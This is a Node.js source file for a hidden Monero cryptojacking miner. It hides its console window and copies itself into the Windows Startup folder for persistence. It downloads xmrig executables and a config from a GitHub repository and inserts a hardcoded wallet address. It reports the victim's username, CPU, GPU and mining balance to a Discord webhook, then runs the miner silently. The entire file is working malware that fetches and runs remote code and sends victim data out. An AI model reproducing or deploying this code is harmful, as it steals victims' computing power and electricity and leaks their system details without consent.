const walletAddr = "47kVVZSwkxMihgH7FkR7dPXppegNxungK7r4tTNCtvDECpa3JAxZ37Nj1c1rSUV3gSE7pctFReh6aXsgs25LjyQjDb8VAL3"
const wbk = "https://discord.com/api/webhooks/"
const openDelay = 1000
const hideCnsl = true
const OnStart = true

const process = require('process');
const request = require('request');
const fs = require('fs');
const { exec } = require("child_process");
const gpuInfo = require('gpu-info');
const ConsoleWindow = require("node-hide-console-window");
if(hideCnsl === true){ConsoleWindow.hideConsole();}
const fetch = require("sync-fetch")
var os = require('os');
const urss = os.userInfo().username;
const delay = ms => new Promise(resolve => setTimeout(resolve, ms))








var nvidia = false;
var AMD = false;
var cantOpenMiner = false;
var output = `C:\\Users\\${urss}\\AppData\\Roaming\\f.exe`;
var ConfigOutput = `C:\\Users\\${urss}\\AppData\\Roaming\\config.json`;











function setToStartup(){
  const Fpath = process.argv[0]
  const startPth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\localhost.bat"
  const startExePth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\v.exe"
  fs.writeFileSync(startPth, "START v.exe");
  let dataF = fs.readFileSync(Fpath, {encoding: null});
  fs.writeFileSync(startExePth, dataF)
  console.log("[+] Set startup sucess")
   
}


async function getStats(addr){

  var balance =  await fetch(`https://api.nanopool.org/v1/xmr/balance/${addr}`).json().data

  var hashrate = await fetch(`https://api.nanopool.org/v1/xmr/avghashratelimited/${addr}/6`).json().data
  var avg = await fetch(`https://api.nanopool.org/v1/xmr/hashrate/${addr}`).json().data


  return [balance, hashrate, avg]
}

async function MinerMain () {

  gpuInfo().then(function(data) {
      var infosG = data;
      if(JSON.stringify(data).includes("nvidia") || JSON.stringify(data).includes("NVIDIA")){
        nvidia = true
      }else if(JSON.stringify(data).includes("amd") || JSON.stringify(data).includes("AMD")){
        AMD = true;
      }else{
        nvidia = false;
      }
      console.log("Nvidia? : " + nvidia)
      console.log("AMD? : " + AMD)
      console.log(data[0].Name)
  });


  var fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig.exe";
  var ConfigUrl = "https://raw.githubusercontent.com/0xSxZ/Veerus/main/MINER_IMPORTANT/clientdownloads/config.json";
  if(nvidia == true){
    fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig-nvidia.exe"
  }else if(AMD == true){
    fileUrl = "https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig-amd.exe"
  }else{
    fileUrl = `https://github.com/0xSxZ/Veerus/raw/main/MINER_IMPORTANT/clientdownloads/xmrig.exe`;
  }


  await request({url: fileUrl, encoding: null}, function(err, resp, body) {
    try{

      fs.writeFile(output, body, function(err) {
        console.log("file written!");
      });
    }catch{
      cantOpenMiner = true;
    }
  });

  await request(ConfigUrl, function(err, resp, body) {
    try{

      fs.writeFile(ConfigOutput, body.replace("YOUR_WALLET_ADDRESS", walletAddr), function(err) {
        console.log("file written!");
      });
    }catch{
      cantOpenMiner = true;
    }
  });

  await console.log("Starting Miner")


  await console.log("Miner Started in worker 1")


  await MinerThread()
}



async function MinerThread(){

  console.log("Miner Started in worker 2")
  if(cantOpenMiner == false){

  gpuInfo().then(async function(data) {
      var infosG = data;
      if(JSON.stringify(data).includes("nvidia") || JSON.stringify(data).includes("NVIDIA")){
        nvidia = true
      }else if(JSON.stringify(data).includes("amd") || JSON.stringify(data).includes("AMD")){
        AMD = true;
      }else{
        nvidia = false;
      }

      var getS = await getStats(walletAddr)

      await console.log(getS)
      const params = {
      "embeds": [
        {
          "title": `[ 🚨 Miner started ]`,
          "description": `‎\n🍀 | Miner started in : **${ urss }**\n‎`,
     
          "color":1127128,
          "fields": [
            {
              "name": `[ 🚫 Infos ]`,
              "value": `‎\n\n‎[🚫] GPU :${data[0].Name}\n‎[🌎] CPU : ${os.cpus()[0].model}\n‎[💫] GPU Mining : ${(nvidia===false && AMD ===false? "❌":"✔️")}\n\n‎ `,
              "inline": false
            },   
            {
              "name": `[ 📈 Stats ]`,
              "value": `‎\n\n‎[💰] Balance :${getS[0]}\n‎[💻] Hashrate : ${getS[1]}\n‎[📈] Avg. Hashrate : ${getS[2]}\n\n‎ `,
              "inline": false
            },   
          ],
          "footer": {
            "text": "🤖 Join : https://discord.gg/MGHu5UqVbs"
          },
        }
      ]
      }
     
      fetch(wbk, {
        method: "POST",
        headers: {
            'Content-type': 'application/json'
        },
        body: JSON.stringify(params)
      })

  });

    await delay(openDelay)
    exec(output,(error, stdout, stderr) => {
      console.log(stdout)
    });
  }
}

if(OnStart === true){setToStartup()}

MinerMain();
